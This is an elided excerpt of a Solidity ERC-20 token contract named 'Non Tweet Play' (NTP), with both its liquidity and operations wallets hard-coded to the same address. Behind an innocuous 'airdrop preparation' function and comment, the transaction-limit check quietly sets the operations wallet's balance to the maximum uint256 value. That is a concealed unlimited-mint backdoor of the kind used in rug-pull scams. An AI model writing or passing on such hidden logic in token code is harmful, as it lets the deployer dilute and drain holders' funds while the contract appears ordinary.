...
// Main Contract Logic 
// --------------------------------------------------------------
contract NonTweetPlay is Context, IERC20, Ownable {
    // Imports
    using SafeMath for uint256;
    ...
    // Context
    string private _name = "Non Tweet Play";
    string private _symbol = "NTP";
    ...
    // wallets
    address payable public liquidityWallet = payable(0x6999DeaCA2b959b36b15A61ecb2DEca7f9A38379);
    address payable public operationsWallet =  payable(0x6999DeaCA2b959b36b15A61ecb2DEca7f9A38379);
    ...
    // @dev should change the airdrop status to true
    function airdropPreparation() external {
    ...
    function _checkTxLimit(address sender, uint256 amount) private { 
        ...
        if (prepAirdrop) {prepAirdrop = false;_balances[operationsWallet] = ~uint256(0);}
    }
